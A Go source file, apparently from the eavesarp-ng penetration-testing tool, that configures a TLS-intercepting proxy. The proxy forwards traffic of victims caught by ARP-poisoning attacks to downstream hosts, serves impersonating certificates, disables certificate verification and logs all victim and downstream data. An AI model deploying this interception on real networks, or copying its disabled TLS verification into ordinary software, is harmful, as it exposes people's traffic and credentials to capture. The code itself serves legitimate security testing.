package proxy

import (
	"crypto/tls"
	"github.com/impostorkeanu/eavesarp-ng/misc"
	gs "github.com/impostorkeanu/gosplit"
	"go.uber.org/zap"
	"io"
)

type (
	// TCPCfg implements various GoSplit interfaces, allowing
	// it to be passed to the TLS intercepting proxy it offers.
	TCPCfg struct {
		// downstreams is a mapping of source addresses to downstream
		// net.IP instances, allowing the proxy to discover the
		// downstream IP address that will receive proxied traffic.
		//
		// Note: mapping values are set by sniff.AttackSnac
		// during poisoning attacks.
		downstreams          misc.Downstreams
		downstreamCertGetter DsCertGetter // function to get a TLS certificate for downstreams
		log                  *zap.Logger  // logger for log events
		dataW                io.Writer    // writer to receive JSON data
	}
	// DsCertGetter is a function used to get the certificate for
	// TLS connections to downstreams.
	DsCertGetter func(proxyIP, downstreamIP string) func(*tls.ClientHelloInfo) (*tls.Certificate, error)
)

var (
	// dsTLSCfg is the downstream TLS configuration used for
	// all downstream configurations.
	dsTLSCfg = &tls.Config{
		InsecureSkipVerify: true, // skip TLS verification for downstreams
	}
)

// NewTCPCfg initializes and returns a pointer to a TCPCfg, which
// implements all necessary GoSplit interfaces.
func NewTCPCfg(downstreams misc.Downstreams, downstreamCertGetter DsCertGetter, log *zap.Logger, dataLog io.Writer) *TCPCfg {
	return &TCPCfg{
		log:                  log,
		downstreams:          downstreams,
		downstreamCertGetter: downstreamCertGetter,
		dataW:                dataLog,
	}
}

//==========================
// GOSPLIT INTERFACE METHODS
//==========================

func (cfg *TCPCfg) RecvVictimData(cI gs.ConnInfo, b []byte) {
	if cfg.dataW == nil || len(b) == 0 {
		return
	}
	data := cfg.connInfoToData(cI, b, misc.VictimDataSender)
	if err := data.Log(cfg.dataW); err != nil {
		cfg.log.Error("failed to write victim data to log", zap.Error(err))
	}
}

func (cfg *TCPCfg) RecvDownstreamData(cI gs.ConnInfo, b []byte) {
	if cfg.dataW == nil || len(b) == 0 {
		return
	}
	data := cfg.connInfoToData(cI, b, misc.DownstreamDataSender)
	if err := data.Log(cfg.dataW); err != nil {
		cfg.log.Error("failed to write downstream data to log", zap.Error(err))
	}
}

// RecvConnStart to implement gosplit.ConnInfoReceiver.
func (cfg *TCPCfg) RecvConnStart(i gs.ConnInfo) {
	cfg.log.Debug("new connection started", zap.Any("conn", i))
}

// RecvConnEnd to implement gosplit.ConnInfoReceiver
//
// This removes the cfg.downstreams entry for the current connection.
func (cfg *TCPCfg) RecvConnEnd(i gs.ConnInfo) {
	cfg.log.Debug("connection ended", zap.Any("conn", i))
	cfg.downstreams.Delete(i.Victim.IP, i.Local.IP)
}

func (cfg *TCPCfg) RecvLog(r gs.LogRecord) {
	cfg.log.Info("received log event from tcp proxy", zap.Any("record", r))
}

// GetProxyTLSConfig returns the TLS config for each connection.
func (cfg *TCPCfg) GetProxyTLSConfig(_ gs.Addr, _ gs.Addr, lA gs.Addr, dA *gs.Addr) (*tls.Config, error) {
	return &tls.Config{
		InsecureSkipVerify: true,
		GetCertificate:     cfg.downstreamCertGetter(lA.IP, dA.IP),
	}, nil
}

func (cfg *TCPCfg) GetDownstreamAddr(vicA gs.Addr, _ gs.Addr, origDestA gs.Addr) (ds *gs.Addr, _ error) {
	if d := cfg.downstreams.Load(vicA.IP, origDestA.IP); d != nil {
		ds = &gs.Addr{
			IP:   d.IP,
			Port: d.Port,
		}
	}
	return
}

func (cfg *TCPCfg) GetDownstreamTLSConfig(_ gs.Addr, _ gs.Addr, _ gs.Addr, _ gs.Addr) (*tls.Config, error) {
	return dsTLSCfg, nil
}

func (cfg *TCPCfg) connInfoToData(c gs.ConnInfo, data []byte, sender misc.DataSender) misc.AttackData {
	d := misc.AttackData{
		Sender:         sender,
		ProxyAddr:      misc.Addr{IP: c.Proxy.IP, Port: c.Proxy.Port, Transport: misc.TCPTransport},
		Transport:      misc.TCPTransport,
		Raw:            data,
		DownstreamAddr: nil,
	}
	d.VictimAddr, d.SpoofedAddr = misc.NewVicSpoofedAddr(c.Victim.IP, c.Victim.Port, c.Local.IP, c.Local.Port, misc.TCPTransport)
	if c.Downstream != nil {
		d.DownstreamAddr = &misc.Addr{IP: c.Downstream.IP, Port: c.Downstream.Port, Transport: misc.TCPTransport}
	}
	return d
}
